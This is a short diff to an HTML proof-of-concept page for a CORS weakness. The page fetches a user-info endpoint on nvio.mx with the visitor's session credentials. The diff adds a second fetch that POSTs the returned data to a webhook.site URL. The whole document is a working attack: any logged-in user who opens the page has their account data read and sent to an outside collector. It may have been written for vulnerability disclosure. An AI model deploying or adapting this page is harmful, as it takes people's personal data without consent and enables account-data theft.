@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h1>CORS PoC Running...</h1>
     <script>
-      fetch("https://nvio.mx/api/userinfo", {
-        credentials: "include"
-      })
+      fetch("https://nvio.mx/api/userinfo", { credentials: "include" })
         .then(res => res.text())
         .then(data => {
-          document.write(`<h2>Response:</h2><pre>${data}</pre>`);
+          document.body.innerHTML += `<pre>${data}</pre>`;
+          fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
+            method: "POST",
+            body: data
+          });
+        })
+        .catch(err => {
+          document.body.innerHTML += `<pre style="color:red;">Error: ${err}</pre>`;
         });
     </script>
   </body>
